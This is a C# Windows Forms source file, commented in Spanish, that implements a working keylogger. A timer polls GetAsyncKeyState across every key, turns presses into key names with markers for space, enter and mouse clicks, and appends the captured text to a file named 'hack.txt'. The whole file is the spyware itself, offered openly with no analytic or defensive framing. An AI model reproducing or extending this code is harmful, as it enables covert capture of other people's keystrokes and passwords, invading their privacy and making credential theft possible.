using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Configuration;
using System.Runtime.InteropServices;
using System.IO;

namespace Keylogger
{
    public partial class frmService : Form
    {
        #region DeclaracionVariables
        //declarar un timer
        private System.Windows.Forms.Timer timer;
        //obtener la tecla seleccionada por el usuario
        [DllImport("User32.dll")] private static extern short GetAsyncKeyState(int vKey);
        //variable para guardar el texto ingresado por el usuario
        string texto = "";
        #endregion

        #region MetodosPrivados
        // metodo para iniciar servicio 
        private void inicioServicio(object sender, EventArgs e)
        {
            try
            {
                //Instanciar el timer
                timer = new System.Windows.Forms.Timer();
                //Setear el intervalo del timer
                timer.Interval = Convert.ToInt32(ConfigurationManager.AppSettings["intervaloEjecucion"]);
                //habilitar el timer
                timer.Enabled = true;
                //cuando se cumpla el tiempo del timer ejecutar el evento Tempotizador
                this.timer.Tick += new EventHandler(EventoTemporizador);
            }
            catch(Exception ex) { 
            
            }
            
        }
        //evento para enviar las teclas ingresadas por el usuario a un archivo
        private void EventoTemporizador(object sender, EventArgs e)
        {
            //variable para guardar los caracteres especiasles
            string buffer = "";
            //variable para guardar caracteres comunes
            string temp = "";

            //iterar en un for buscar la tecla que se ingreso
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                //si se ingreso una  tecla
                if (GetAsyncKeyState(i) == -32767)
                {
                    //iniciar el buffer vacio
                    buffer = "";
                    //guardar en el temporal la tecla ingresada
                    temp = Enum.GetName(typeof(Keys), i);



                    // Switch para guardar los caracteres especialews
                    switch (Enum.GetName(typeof(Keys), i))
                    {
                        //si es un espacio
                        case "Space":
                            buffer += " ";
                            break;
                        //si se ingreso un enter
                        case "Enter":
                            //buffer += "\r\n";
                            buffer += "[<|]";
                            break;
                        case "LButton":
                            //Click Derecho
                            buffer += "[CI]";
                            break;

                        default:
                            buffer += Enum.GetName(typeof(Keys), i);
                            break;
                    }




                }

            }
            //añadir el buffer al texto
            texto += buffer;
            //si se ingreso mas de 10 caracteres
            if (texto.Length > 10)
            {
                //enviar el texto ingresado a la funcion de guardar texto
                archivo(texto);
                //colocar el texto como vacio para no enviar datos guardados
                texto = "";
            }


        }
        //funcion para guardar archivo
        private void archivo(string txt)
        {
            // Crear un objeto stream writer para guardar el texto en un pad colocando como nombre "hack.txt"
            StreamWriter stream = new StreamWriter("hack.txt", true);
            //Escribir en el pad el texto que ingreso el usuario
            stream.Write(txt);
            //Cerrar el pad
            stream.Close();


        }

        #endregion
        public frmService()
        {
            InitializeComponent();
        }

        //metodo para detener el servicio
        private void detenerServicio(object sender, EventArgs e)
        {
            //deshabilitar el timer
            timer.Enabled = false;
            //detener el timer
            timer.Stop();
        }

        private void frmService_Load(object sender, EventArgs e)
        {

        }
    }
}
